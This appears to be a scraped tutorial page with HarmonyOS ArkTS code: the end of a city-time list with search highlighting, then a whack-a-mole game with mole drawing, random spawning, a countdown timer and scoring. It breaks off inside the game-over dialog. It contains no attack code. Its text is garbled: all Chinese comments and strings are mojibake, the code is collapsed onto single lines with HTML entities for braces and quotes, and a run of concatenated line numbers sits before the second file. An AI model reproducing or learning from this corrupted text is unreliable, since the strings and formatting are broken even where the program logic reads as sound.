.layoutWeight(this.ratio[1])// è®¾ç½®å¸ƒå±€æƒé‡ .textAlign(TextAlign.Center)// æ–‡æœ¬å±…ä¸­ .fontSize(this.textSize)// è®¾ç½®å­—ä½“å¤§å° .fontWeight(600)// è®¾ç½®å­—ä½“ç²—ç»† .fontColor(this.textColor) // è®¾ç½®å­—ä½“é¢œè‰² &#125;.height(this.rowHeight).borderWidth(this.lineWidth).borderColor(this.lineColor) // è®¾ç½®è¡Œé«˜å’Œè¾¹æ¡† .backgroundColor(this.titleBackgroundColor) // è®¾ç½®èƒŒæ™¯è‰² &#125;.width(`100%`).padding(&#123; left: this.basePadding, right: this.basePadding &#125;) // è®¾ç½®åˆ—å®½å’Œå†…è¾¹è· Scroll() &#123; // åˆ›å»ºå¯æ»šåŠ¨åŒºåŸŸ Column() &#123; // åˆ›å»ºä¸€ä¸ªåˆ— ForEach(this.cityTimeList, (item: CityTimeInfo) =&gt; &#123; // éå†åŸå¸‚æ—¶é—´åˆ—è¡¨ Row() &#123; // åˆ›å»ºä¸€è¡Œ Text() &#123; // åˆ›å»ºæ–‡æœ¬ ForEach(this.highlightSearchText(item, this.searchText), (segment: string, index: number) =&gt; &#123; // é«˜äº®æœç´¢æ–‡æœ¬ ContainerSpan() &#123; // åˆ›å»ºå®¹å™¨ Span(segment)// åˆ›å»ºæ–‡æœ¬æ®µ .fontColor(segment === this.searchText ? Color.White : Color.Black)// è®¾ç½®å­—ä½“é¢œè‰² .onClick(() =&gt; &#123; // ç‚¹å‡»äº‹ä»¶ console.info(`é«˜äº®æ–‡æœ¬è¢«ç‚¹å‡»ï¼š$&#123;segment&#125;`); // è¾“å‡ºç‚¹å‡»çš„æ–‡æœ¬ console.info(`ç‚¹å‡»ç´¢å¼•ï¼š$&#123;index&#125;`); // è¾“å‡ºç‚¹å‡»çš„ç´¢å¼• &#125;); &#125;.textBackgroundStyle(&#123; // è®¾ç½®æ–‡æœ¬èƒŒæ™¯æ ·å¼ color: segment === this.searchText ? Color.Red : Color.Transparent // æ ¹æ®æ˜¯å¦åŒ¹é…è®¾ç½®èƒŒæ™¯è‰² &#125;); &#125;); &#125; .height(&#x27;100%&#x27;) // é«˜åº¦å æ»¡ .layoutWeight(this.ratio[0]) // è®¾ç½®å¸ƒå±€æƒé‡ .textAlign(TextAlign.Center) // æ–‡æœ¬å±…ä¸­ .fontSize(this.textSize) // è®¾ç½®å­—ä½“å¤§å° .fontColor(this.textColor) // è®¾ç½®å­—ä½“é¢œè‰² Line().height(&#x27;100%&#x27;).width(this.lineWidth).backgroundColor(this.lineColor) // åˆ›å»ºåˆ†éš”çº¿ Text(item.currentTime)// æ˜¾ç¤ºå½“å‰æ—¶é—´ .height(&#x27;100%&#x27;)// é«˜åº¦å æ»¡ .layoutWeight(this.ratio[1])// è®¾ç½®å¸ƒå±€æƒé‡ .textAlign(TextAlign.Center)// æ–‡æœ¬å±…ä¸­ .fontSize(this.textSize)// è®¾ç½®å­—ä½“å¤§å° .fontColor(this.textColor) // è®¾ç½®å­—ä½“é¢œè‰² &#125; .height(this.rowHeight) // è®¾ç½®è¡Œé«˜ .borderWidth(&#123; left: this.lineWidth, right: this.lineWidth, bottom: this.lineWidth &#125;) // è®¾ç½®è¾¹æ¡†å®½åº¦ .borderColor(this.lineColor) // è®¾ç½®è¾¹æ¡†é¢œè‰² .visibility(item.isVisible ? Visibility.Visible : Visibility.None) // æ ¹æ®å¯è§æ€§è®¾ç½®æ˜¾ç¤ºçŠ¶æ€ &#125;) &#125;.width(`100%`).padding(&#123; left: this.basePadding, right: this.basePadding &#125;) // è®¾ç½®å®½åº¦å’Œå†…è¾¹è· &#125; .width(&#x27;100%&#x27;) // è®¾ç½®å®½åº¦å æ»¡ .layoutWeight(1) // è®¾ç½®å¸ƒå±€æƒé‡ .align(Alignment.Top) // å¯¹é½æ–¹å¼ .onScrollStart(() =&gt; &#123; // æ»šåŠ¨å¼€å§‹äº‹ä»¶ this.onPageHide() // é¡µé¢éšè—å¤„ç† &#125;) .onScrollStop(() =&gt; &#123; // æ»šåŠ¨åœæ­¢äº‹ä»¶ this.onPageShow() // é¡µé¢æ˜¾ç¤ºå¤„ç† &#125;) .onTouch((event) =&gt; &#123; // è§¦æ‘¸äº‹ä»¶ if (event.type == TouchType.Down) &#123; // å¦‚æœæ˜¯æŒ‰ä¸‹äº‹ä»¶ inputMethod.getController().stopInputSession() // åœæ­¢è¾“å…¥ä¼šè¯ &#125; &#125;) &#125; &#125;&#125; æ‰“åœ°é¼ ä¸»è¦åŠŸèƒ½ï¼šåœ°é¼ ç»„ä»¶ï¼šHamster ç»“æ„ä½“å®šå¤–è§‚ï¼Œä¾å•å…ƒæ ¼å®½è°ƒå°ºå¯¸ã€‚å•å…ƒæ ¼ Cellï¼šæœ‰åœ°é¼ æ˜¾ç¤ºçŠ¶æ€åŠç¼©æ”¾é€‰é¡¹ï¼Œå« setSelectedTrueTime è®¾æ˜¾ç¤ºæ—¶é—´æˆ³ã€checkTime æ£€æ˜¯å¦è¶…åœç•™æ—¶é—´éšè—ã€‚æ¸¸æˆä¸»ç»„ä»¶ Indexï¼šç»´æŠ¤æ ¸å¿ƒçŠ¶æ€å¦‚åŠ¨ç”»é—´éš”ç­‰ï¼Œæœ‰ startGame ä¸ endGame æ–¹æ³•åˆå§‹åŒ–ä¸é‡ç½®æ•°æ®ã€‚ç•Œé¢æ„å»ºï¼šIndex ç»„ä»¶ build æ–¹æ³•å®šå¸ƒå±€ï¼Œå«è®¡æ—¶å™¨ã€å¾—åˆ†æ¿åŠå•å…ƒæ ¼ã€‚æ—¶é—´ä¸æ˜¾ç¤ºé€»è¾‘ï¼šTextTimer ç»„ä»¶æ§æ—¶ï¼Œå®šæ—¶é€‰å•å…ƒæ ¼æ˜¾åœ°é¼ ï¼Œç‚¹å‡»åœ°é¼ å¢åˆ†å¹¶æ‰§è¡ŒåŠ¨ç”»ã€‚ç”¨æˆ·äº¤äº’ï¼šç‚¹å‡»åœ°é¼ å•å…ƒæ ¼å¾—åˆ†ï¼Œç‚¹å‡»ååœ°é¼ éšè—ä¸”æ›´æ–°å¾—åˆ†ã€‚ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342//index.etsimport &#123; curves, window &#125; from &#x27;@kit.ArkUI&#x27; // å¯¼å…¥æ‰€éœ€çš„åº“å’Œæ¨¡å—// å®šä¹‰åœ°é¼ ç»„ä»¶@Componentstruct Hamster &#123; @Prop cellWidth: number // å®šä¹‰ä¸€ä¸ªå±æ€§ï¼Œè¡¨ç¤ºå•å…ƒæ ¼çš„å®½åº¦ build() &#123; Stack() &#123; // åˆ›å»ºä¸€ä¸ªå †å å¸ƒå±€ // èº«ä½“ Text() .width(`$&#123;this.cellWidth / 2&#125;lpx`) // è®¾ç½®å®½åº¦ä¸ºå•å…ƒæ ¼å®½åº¦çš„ä¸€åŠ .height(`$&#123;this.cellWidth / 3 * 2&#125;lpx`) // è®¾ç½®é«˜åº¦ä¸ºå•å…ƒæ ¼é«˜åº¦çš„2/3 .backgroundColor(&quot;#b49579&quot;) // è®¾ç½®èƒŒæ™¯é¢œè‰² .borderRadius(&#123; topLeft: &#x27;50%&#x27;, topRight: &#x27;50%&#x27; &#125;) // è®¾ç½®åœ†è§’ .borderColor(&quot;#2a272d&quot;) // è®¾ç½®è¾¹æ¡†é¢œè‰² .borderWidth(1) // è®¾ç½®è¾¹æ¡†å®½åº¦ // å˜´å·´ Ellipse() .width(`$&#123;this.cellWidth / 4&#125;lpx`) // è®¾ç½®å˜´å·´çš„å®½åº¦ .height(`$&#123;this.cellWidth / 5&#125;lpx`) // è®¾ç½®å˜´å·´çš„é«˜åº¦ .fillOpacity(1) // è®¾ç½®å¡«å……ä¸é€æ˜åº¦ .fill(&quot;#e7bad7&quot;) // è®¾ç½®å¡«å……é¢œè‰² .stroke(&quot;#563e3f&quot;) // è®¾ç½®è¾¹æ¡†é¢œè‰² .strokeWidth(1) // è®¾ç½®è¾¹æ¡†å®½åº¦ .margin(&#123; top: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // è®¾ç½®ä¸Šè¾¹è· // å·¦çœ¼ç› Ellipse() .width(`$&#123;this.cellWidth / 9&#125;lpx`) // è®¾ç½®å·¦çœ¼ç›çš„å®½åº¦ .height(`$&#123;this.cellWidth / 6&#125;lpx`) // è®¾ç½®å·¦çœ¼ç›çš„é«˜åº¦ .fillOpacity(1) // è®¾ç½®å¡«å……ä¸é€æ˜åº¦ .fill(&quot;#313028&quot;) // è®¾ç½®å¡«å……é¢œè‰² .stroke(&quot;#2e2018&quot;) // è®¾ç½®è¾¹æ¡†é¢œè‰² .strokeWidth(1) // è®¾ç½®è¾¹æ¡†å®½åº¦ .margin(&#123; bottom: `$&#123;this.cellWidth / 3&#125;lpx`, right: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // è®¾ç½®ä¸‹è¾¹è·å’Œå³è¾¹è· // å³çœ¼ç› Ellipse() .width(`$&#123;this.cellWidth / 9&#125;lpx`) // è®¾ç½®å³çœ¼ç›çš„å®½åº¦ .height(`$&#123;this.cellWidth / 6&#125;lpx`) // è®¾ç½®å³çœ¼ç›çš„é«˜åº¦ .fillOpacity(1) // è®¾ç½®å¡«å……ä¸é€æ˜åº¦ .fill(&quot;#313028&quot;) // è®¾ç½®å¡«å……é¢œè‰² .stroke(&quot;#2e2018&quot;) // è®¾ç½®è¾¹æ¡†é¢œè‰² .strokeWidth(1) // è®¾ç½®è¾¹æ¡†å®½åº¦ .margin(&#123; bottom: `$&#123;this.cellWidth / 3&#125;lpx`, left: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // è®¾ç½®ä¸‹è¾¹è·å’Œå·¦è¾¹è· // å·¦çœ¼ç³ Ellipse() .width(`$&#123;this.cellWidth / 20&#125;lpx`) // è®¾ç½®å·¦çœ¼ç³çš„å®½åº¦ .height(`$&#123;this.cellWidth / 15&#125;lpx`) // è®¾ç½®å·¦çœ¼ç³çš„é«˜åº¦ .fillOpacity(1) // è®¾ç½®å¡«å……ä¸é€æ˜åº¦ .fill(&quot;#fefbfa&quot;) // è®¾ç½®å¡«å……é¢œè‰² .margin(&#123; bottom: `$&#123;this.cellWidth / 2.5&#125;lpx`, right: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // è®¾ç½®ä¸‹è¾¹è·å’Œå³è¾¹è· // å³çœ¼ç³ Ellipse() .width(`$&#123;this.cellWidth / 20&#125;lpx`) // è®¾ç½®å³çœ¼ç³çš„å®½åº¦ .height(`$&#123;this.cellWidth / 15&#125;lpx`) // è®¾ç½®å³çœ¼ç³çš„é«˜åº¦ .fillOpacity(1) // è®¾ç½®å¡«å……ä¸é€æ˜åº¦ .fill(&quot;#fefbfa&quot;) // è®¾ç½®å¡«å……é¢œè‰² .margin(&#123; bottom: `$&#123;this.cellWidth / 2.5&#125;lpx`, left: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // è®¾ç½®ä¸‹è¾¹è·å’Œå·¦è¾¹è· &#125;.width(`$&#123;this.cellWidth&#125;lpx`).height(`$&#123;this.cellWidth&#125;lpx`) // è®¾ç½®ç»„ä»¶çš„å®½åº¦å’Œé«˜åº¦ &#125;&#125;// å®šä¹‰å•å…ƒæ ¼ç±»@ObservedV2class Cell &#123; @Trace scaleOptions: ScaleOptions = &#123; x: 1, y: 1 &#125;; // å®šä¹‰ç¼©æ”¾é€‰é¡¹ @Trace isSelected: boolean = false // trueè¡¨ç¤ºæ˜¾ç¤ºåœ°é¼ ï¼Œfalseè¡¨ç¤ºéšè—åœ°é¼  cellWidth: number // å•å…ƒæ ¼å®½åº¦ selectTime: number = 0 // é€‰æ‹©æ—¶é—´ constructor(cellWidth: number) &#123; // æ„é€ å‡½æ•° this.cellWidth = cellWidth // åˆå§‹åŒ–å•å…ƒæ ¼å®½åº¦ &#125; setSelectedTrueTime() &#123; // è®¾ç½®é€‰æ‹©æ—¶é—´ this.selectTime = Date.now() // è®°å½•å½“å‰æ—¶é—´ this.isSelected = true // è®¾ç½®ä¸ºé€‰ä¸­çŠ¶æ€ &#125; checkTime(stayDuration: number) &#123; // æ£€æŸ¥åœç•™æ—¶é—´ if (this.isSelected) &#123; // å¦‚æœå½“å‰æ˜¯é€‰ä¸­çŠ¶æ€ if (Date.now() - this.selectTime &gt;= stayDuration) &#123; // å¦‚æœåœç•™æ—¶é—´è¶…è¿‡è®¾å®šå€¼ this.selectTime = 0 // é‡ç½®é€‰æ‹©æ—¶é—´ this.isSelected = false // è®¾ç½®ä¸ºæœªé€‰ä¸­çŠ¶æ€ &#125; &#125; &#125;&#125;// å®šä¹‰æ–‡æœ¬è®¡æ—¶å™¨ä¿®é¥°ç¬¦ç±»class MyTextTimerModifier implements ContentModifier&lt;TextTimerConfiguration&gt; &#123; constructor() &#123;&#125; applyContent(): WrappedBuilder&lt;[TextTimerConfiguration]&gt; &#123; // åº”ç”¨å†…å®¹ return wrapBuilder(buildTextTimer) // è¿”å›æ„å»ºæ–‡æœ¬è®¡æ—¶å™¨çš„å‡½æ•° &#125;&#125;// æ„å»ºæ–‡æœ¬è®¡æ—¶å™¨çš„å‡½æ•°@Builderfunction buildTextTimer(config: TextTimerConfiguration) &#123; Column() &#123; Stack(&#123; alignContent: Alignment.Center &#125;) &#123; // åˆ›å»ºä¸€ä¸ªå †å å¸ƒå±€ï¼Œå†…å®¹å±…ä¸­å¯¹é½ Circle(&#123; width: 150, height: 150 &#125;) // åˆ›å»ºä¸€ä¸ªåœ†å½¢ .fill(config.started ? (config.isCountDown ? 0xFF232323 : 0xFF717171) : 0xFF929292) // æ ¹æ®çŠ¶æ€è®¾ç½®å¡«å……é¢œè‰² Column() &#123; Text(config.isCountDown ? &quot;å€’è®¡æ—¶&quot; : &quot;æ­£è®¡æ—¶&quot;).fontColor(Color.White) // æ˜¾ç¤ºè®¡æ—¶çŠ¶æ€ Text( (config.isCountDown ? &quot;å‰©ä½™&quot; : &quot;å·²ç»è¿‡å»äº†&quot;) + (config.isCountDown ? (Math.max(config.count / 1000 - config.elapsedTime / 100, 0)).toFixed(0) // è®¡ç®—å‰©ä½™æ—¶é—´ : ((config.elapsedTime / 100).toFixed(0)) // è®¡ç®—å·²è¿‡å»æ—¶é—´ ) + &quot;ç§’&quot; ).fontColor(Color.White) // æ˜¾ç¤ºæ—¶é—´ &#125; &#125; &#125;&#125;// å®šä¹‰æ¸¸æˆä¸»ç»„ä»¶@Entry@Componentstruct Index &#123; @State animationIntervalCount: number = 0 // åŠ¨ç”»é—´éš”è®¡æ•° @State appearanceCount: number = 4 // æ¯æ¬¡å‡ºç°çš„åœ°é¼ æ•°é‡ @State animationInterval: number = 1000 // åœ°é¼ å‡ºç°çš„é—´éš”æ—¶é—´ @State hamsterStayDuration: number = 1500 // åœ°é¼ åœç•™æ—¶é—´ @State gameDuration: number = 30000 // æ¸¸æˆæ€»æ—¶é•¿ @State randomPositionIndex: number = 0 // éšæœºä½ç½® @State cells: Cell[] = [] // å­˜å‚¨åœ°é¼ å•å…ƒæ ¼ @State cellWidth: number = 100 // å•å…ƒæ ¼å®½åº¦ @State currentScore: number = 0 // å½“å‰æ¸¸æˆå¾—åˆ† @State timerModifier: MyTextTimerModifier = new MyTextTimerModifier() // è®¡æ—¶å™¨ä¿®é¥°ç¬¦ countdownTimerController: TextTimerController = new TextTimerController() // å€’è®¡æ—¶æ§åˆ¶å™¨ timerController: TextTimerController = new TextTimerController() // æ­£è®¡æ—¶æ§åˆ¶å™¨ aboutToAppear(): void &#123; // è®¾ç½®å½“å‰appä»¥æ¨ªå±æ–¹å¼æ˜¾ç¤º window.getLastWindow(getContext()).then((windowClass) =&gt; &#123; windowClass.setPreferredOrientation(window.Orientation.LANDSCAPE) // è®¾ç½®ä¸ºæ¨ªå± &#125;) // æ˜¾ç¤º10ä¸ªåœ°é¼ å‘ä½ for (let i = 0; i &lt; 10; i++) &#123; this.cells.push(new Cell(this.cellWidth)) // åˆå§‹åŒ–10ä¸ªå•å…ƒæ ¼ &#125; &#125; endGame() &#123; // ç»“æŸæ¸¸æˆ this.animationIntervalCount = 0 // é‡ç½®åŠ¨ç”»é—´éš”è®¡æ•° this.currentScore = 0 // é‡ç½®å¾—åˆ† for (let i = 0; i &lt; this.cells.length; i++) &#123; this.cells[i].isSelected = false // éšè—æ‰€æœ‰åœ°é¼  &#125; this.countdownTimerController.reset() // é‡ç½®å€’è®¡æ—¶ this.timerController.reset() // é‡ç½®æ­£è®¡æ—¶ &#125; startGame() &#123; // å¼€å§‹æ¸¸æˆ this.endGame() // ç»“æŸå½“å‰æ¸¸æˆï¼Œé‡ç½®æ‰€æœ‰çŠ¶æ€ this.countdownTimerController.start() // å¯åŠ¨å€’è®¡æ—¶æ§åˆ¶å™¨ this.timerController.start() // å¯åŠ¨æ­£è®¡æ—¶æ§åˆ¶å™¨ &#125; build() &#123; // æ„å»ºæ¸¸æˆç•Œé¢ Row() &#123; // åˆ›å»ºä¸€ä¸ªæ°´å¹³å¸ƒå±€ // æ˜¾ç¤ºæ—¶é—´ä¸å¾—åˆ† Column(&#123; space: 30 &#125;) &#123; // åˆ›å»ºä¸€ä¸ªå‚ç›´å¸ƒå±€ï¼Œè®¾ç½®é—´è· // æ€»æ—¶é•¿ Column(&#123; space: 5 &#125;) &#123; // åˆ›å»ºä¸€ä¸ªå‚ç›´å¸ƒå±€ï¼Œè®¾ç½®é—´è· Text(`å€’è®¡æ—¶é•¿(ç§’)`).fontColor(Color.Black) // æ˜¾ç¤ºå€’è®¡æ—¶é•¿åº¦çš„æ–‡æœ¬ Counter() &#123; // åˆ›å»ºä¸€ä¸ªè®¡æ•°å™¨ç»„ä»¶ Text(`$&#123;this.gameDuration / 1000&#125;`) // æ˜¾ç¤ºæ¸¸æˆæ€»æ—¶é•¿ï¼ˆç§’ï¼‰ .fontColor(Color.Black) // è®¾ç½®å­—ä½“é¢œè‰² &#125; .width(300) // è®¾ç½®è®¡æ•°å™¨å®½åº¦ .onInc(() =&gt; &#123; // å¢åŠ æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶ this.gameDuration += 1000; // æ¯æ¬¡å¢åŠ 1ç§’ &#125;).onDec(() =&gt; &#123; // å‡å°‘æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶ this.gameDuration -= 1000; // æ¯æ¬¡å‡å°‘1ç§’ this.gameDuration = this.gameDuration &lt; 1000 ? 1000 : this.gameDuration; // ç¡®ä¿æœ€å°å€¼ä¸º1ç§’ &#125;); &#125; // æ¯æ¬¡å‡ºç°ä¸ªæ•° Column(&#123; space: 5 &#125;) &#123; // åˆ›å»ºä¸€ä¸ªå‚ç›´å¸ƒå±€ï¼Œè®¾ç½®é—´è· Text(`æ¯æ¬¡å‡ºç°(ä¸ª)`).fontColor(Color.Black) // æ˜¾ç¤ºæ¯æ¬¡å‡ºç°çš„åœ°é¼ æ•°é‡çš„æ–‡æœ¬ Counter() &#123; // åˆ›å»ºä¸€ä¸ªè®¡æ•°å™¨ç»„ä»¶ Text(`$&#123;this.appearanceCount&#125;`) // æ˜¾ç¤ºæ¯æ¬¡å‡ºç°çš„åœ°é¼ æ•°é‡ .fontColor(Color.Black) // è®¾ç½®å­—ä½“é¢œè‰² &#125; .width(300) // è®¾ç½®è®¡æ•°å™¨å®½åº¦ .onInc(() =&gt; &#123; // å¢åŠ æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶ this.appearanceCount += 1; // æ¯æ¬¡å¢åŠ 1ä¸ª &#125;).onDec(() =&gt; &#123; // å‡å°‘æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶ this.appearanceCount -= 1; // æ¯æ¬¡å‡å°‘1ä¸ª this.appearanceCount = this.appearanceCount &lt; 1 ? 1 : this.appearanceCount; // ç¡®ä¿æœ€å°å€¼ä¸º1 &#125;); &#125; // åœ°é¼ æ¯éš”å¤šé•¿æ—¶é—´æ˜¾ç¤º Column(&#123; space: 5 &#125;) &#123; // åˆ›å»ºä¸€ä¸ªå‚ç›´å¸ƒå±€ï¼Œè®¾ç½®é—´è· Text(`å‡ºç°é—´éš”(æ¯«ç§’)`).fontColor(Color.Black) // æ˜¾ç¤ºåœ°é¼ å‡ºç°é—´éš”çš„æ–‡æœ¬ Counter() &#123; // åˆ›å»ºä¸€ä¸ªè®¡æ•°å™¨ç»„ä»¶ Text(`$&#123;this.animationInterval&#125;`) // æ˜¾ç¤ºåœ°é¼ å‡ºç°çš„é—´éš”æ—¶é—´ .fontColor(Color.Black) // è®¾ç½®å­—ä½“é¢œè‰² &#125; .width(300) // è®¾ç½®è®¡æ•°å™¨å®½åº¦ .onInc(() =&gt; &#123; // å¢åŠ æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶ this.animationInterval += 100; // æ¯æ¬¡å¢åŠ 100æ¯«ç§’ &#125;).onDec(() =&gt; &#123; // å‡å°‘æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶ this.animationInterval -= 100; // æ¯æ¬¡å‡å°‘100æ¯«ç§’ this.animationInterval = this.animationInterval &lt; 100 ? 100 : this.animationInterval; // ç¡®ä¿æœ€å°å€¼ä¸º100æ¯«ç§’ &#125;); &#125; // åœ°é¼ åœç•™æ—¶é—´ Column(&#123; space: 5 &#125;) &#123; // åˆ›å»ºä¸€ä¸ªå‚ç›´å¸ƒå±€ï¼Œè®¾ç½®é—´è· Text(`åœç•™é—´éš”(æ¯«ç§’)`).fontColor(Color.Black) // æ˜¾ç¤ºåœ°é¼ åœç•™æ—¶é—´çš„æ–‡æœ¬ Counter() &#123; // åˆ›å»ºä¸€ä¸ªè®¡æ•°å™¨ç»„ä»¶ Text(`$&#123;this.hamsterStayDuration&#125;`) // æ˜¾ç¤ºåœ°é¼ çš„åœç•™æ—¶é—´ .fontColor(Color.Black) // è®¾ç½®å­—ä½“é¢œè‰² &#125; .width(300) // è®¾ç½®è®¡æ•°å™¨å®½åº¦ .onInc(() =&gt; &#123; // å¢åŠ æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶ this.hamsterStayDuration += 100; // æ¯æ¬¡å¢åŠ 100æ¯«ç§’ &#125;).onDec(() =&gt; &#123; // å‡å°‘æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶ this.hamsterStayDuration -= 100; // æ¯æ¬¡å‡å°‘100æ¯«ç§’ this.hamsterStayDuration = this.hamsterStayDuration &lt; 100 ? 100 : this.hamsterStayDuration; // ç¡®ä¿æœ€å°å€¼ä¸º100æ¯«ç§’ &#125;); &#125; &#125;.layoutWeight(1).padding(&#123; left: 50 &#125;) // è®¾ç½®å¸ƒå±€æƒé‡å’Œå·¦è¾¹è· // æ¸¸æˆåŒº Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; // åˆ›å»ºä¸€ä¸ªå¯æ¢è¡Œçš„å¼¹æ€§å¸ƒå±€ ForEach(this.cells, (cell: Cell, index: number) =&gt; &#123; // éå†æ‰€æœ‰å•å…ƒæ ¼ Stack() &#123; // åˆ›å»ºä¸€ä¸ªå †å å¸ƒå±€ // æ´ Ellipse() .width(`$&#123;this.cellWidth / 1.2&#125;lpx`) // è®¾ç½®æ´çš„å®½åº¦ .height(`$&#123;this.cellWidth / 2.2&#125;lpx`) // è®¾ç½®æ´çš„é«˜åº¦ .fillOpacity(1) // è®¾ç½®å¡«å……ä¸é€æ˜åº¦ .fill(&quot;#020101&quot;) // è®¾ç½®å¡«å……é¢œè‰² .stroke(&quot;#020101&quot;) // è®¾ç½®è¾¹æ¡†é¢œè‰² .strokeWidth(1) // è®¾ç½®è¾¹æ¡†å®½åº¦ .margin(&#123; top: `$&#123;this.cellWidth / 2&#125;lpx` &#125;) // è®¾ç½®ä¸Šè¾¹è· // åœ°é¼  Hamster(&#123; cellWidth: this.cellWidth &#125;) // åˆ›å»ºåœ°é¼ ç»„ä»¶ .visibility(cell.isSelected ? Visibility.Visible : Visibility.None) // æ ¹æ®çŠ¶æ€è®¾ç½®å¯è§æ€§ .scale(cell.scaleOptions) // è®¾ç½®ç¼©æ”¾é€‰é¡¹ &#125;.width(`$&#123;this.cellWidth&#125;lpx`).height(`$&#123;this.cellWidth&#125;lpx`) // è®¾ç½®å †å å¸ƒå±€çš„å®½åº¦å’Œé«˜åº¦ .margin(&#123; left: `$&#123;index == 0 || index == 7 ? this.cellWidth / 2 : 0&#125;lpx` &#125;) // è®¾ç½®å·¦è¾¹è· .onClick(() =&gt; &#123; // ç‚¹å‡»äº‹ä»¶ if (cell.isSelected) &#123; // å¦‚æœå½“å‰å•å…ƒæ ¼æ˜¯é€‰ä¸­çŠ¶æ€ animateToImmediately(&#123; // æ‰§è¡ŒåŠ¨ç”» duration: 200, // åŠ¨ç”»æŒç»­æ—¶é—´ curve: curves.springCurve(10, 1, 228, 30), // åŠ¨ç”»æ›²çº¿ onFinish: () =&gt; &#123; // åŠ¨ç”»ç»“æŸåçš„å›è°ƒ cell.isSelected = false // éšè—åœ°é¼  cell.scaleOptions = &#123; x: 1.0, y: 1.0 &#125;; // é‡ç½®ç¼©æ”¾ this.currentScore += 1 // å¢åŠ å¾—åˆ† &#125; &#125;, () =&gt; &#123; cell.scaleOptions = &#123; x: 0, y: 0 &#125;; // åŠ¨ç”»å¼€å§‹æ—¶ç¼©æ”¾åˆ°0 &#125;) &#125; &#125;) &#125;) &#125;.width(`$&#123;this.cellWidth * 4&#125;lpx`) // è®¾ç½®æ¸¸æˆåŒºçš„å®½åº¦ // æ“ä½œæŒ‰é’® Column(&#123; space: 20 &#125;) &#123; // åˆ›å»ºä¸€ä¸ªå‚ç›´å¸ƒå±€ï¼Œè®¾ç½®é—´è· // å€’è®¡æ—¶ TextTimer(&#123; isCountDown: true, count: this.gameDuration, controller: this.countdownTimerController &#125;) // åˆ›å»ºå€’è®¡æ—¶ç»„ä»¶ .contentModifier(this.timerModifier) // åº”ç”¨è®¡æ—¶å™¨ä¿®é¥°ç¬¦ .onTimer((utc: number, elapsedTime: number) =&gt; &#123; // å®šä¹‰è®¡æ—¶å™¨çš„å›è°ƒ // æ¯éš”æŒ‡å®šæ—¶é—´éšæœºæ˜¾ç¤ºåœ°é¼  if (elapsedTime * 10 &gt;= this.animationInterval * this.animationIntervalCount) &#123; // åˆ¤æ–­æ˜¯å¦è¾¾åˆ°æ˜¾ç¤ºåœ°é¼ çš„æ—¶é—´ this.animationIntervalCount++ // å¢åŠ åŠ¨ç”»é—´éš”è®¡æ•° // è·å–å¯ä»¥å‡ºç°çš„ä½ç½®é›†åˆ let availableIndexList: number[] = [] // å­˜å‚¨å¯ç”¨çš„ç´¢å¼• for (let i = 0; i &lt; this.cells.length; i++) &#123; // éå†æ‰€æœ‰å•å…ƒæ ¼ if (!this.cells[i].isSelected) &#123; // å¦‚æœå½“å‰å•å…ƒæ ¼æœªè¢«é€‰ä¸­ availableIndexList.push(i) // æ·»åŠ åˆ°å¯ç”¨ç´¢å¼•åˆ—è¡¨ &#125; &#125; // æ ¹æ®æ¯æ¬¡å‡ºç°æ¬¡æ•° appearanceCount åˆ©ç”¨æ´—ç‰Œç®—æ³•éšæœºæŠ½å– for (let i = 0; i &lt; availableIndexList.length; i++) &#123; // éå†å¯ç”¨ç´¢å¼•åˆ—è¡¨ let index = Math.floor(Math.random() * (availableIndexList.length - i)) // éšæœºé€‰æ‹©ä¸€ä¸ªç´¢å¼• let temp = availableIndexList[availableIndexList.length - i - 1] // äº¤æ¢ä½ç½® availableIndexList[availableIndexList.length - i - 1] = availableIndexList[index] availableIndexList[index] = temp &#125; // éšæœºæŠ½å– appearanceCountï¼Œå–å‰å‡ ä¸ªå·²ç»æ‰“ä¹±å¥½çš„é¡ºåº for (let i = 0; i &lt; availableIndexList.length; i++) &#123; // éå†å¯ç”¨ç´¢å¼•åˆ—è¡¨ if (i &lt; this.appearanceCount) &#123; // å¦‚æœç´¢å¼•å°äºæ¯æ¬¡å‡ºç°çš„æ•°é‡ this.cells[availableIndexList[i]].setSelectedTrueTime() // è®¾ç½®é€‰ä¸­çš„å•å…ƒæ ¼ä¸ºæ˜¾ç¤ºçŠ¶æ€ &#125; &#125; &#125; if (elapsedTime % 10 == 0) &#123; // æ¯éš”100æ¯«ç§’æ£€æŸ¥ä¸€æ¬¡ console.info(&#x27;æ£€æŸ¥åœç•™æ—¶é—´æ˜¯å¦å·²è¿‡ï¼Œå¦‚æœè¿‡äº†å°±éšè—åœ°é¼ &#x27;) // è¾“å‡ºè°ƒè¯•ä¿¡æ¯ for (let i = 0; i &lt; this.cells.length; i++) &#123; // éå†æ‰€æœ‰å•å…ƒæ ¼ this.cells[i].checkTime(this.hamsterStayDuration) // æ£€æŸ¥æ¯ä¸ªå•å…ƒæ ¼çš„åœç•™æ—¶é—´ &#125; &#125; if (elapsedTime * 10 &gt;= this.gameDuration) &#123; // å¦‚æœè®¡æ—¶ç»“æŸ let currentScore = this.currentScore // è·å–å½“å‰å¾—åˆ† this.getUIContext().showAlertDialog(&#123; // æ˜¾ç¤ºç»“æœå¯¹è¯æ¡† // æ˜¾ç¤ºç»“æœé¡µ title: &#x27;æ¸¸æˆç»“æŸ&#x27;, // å¯¹è¯æ¡†æ 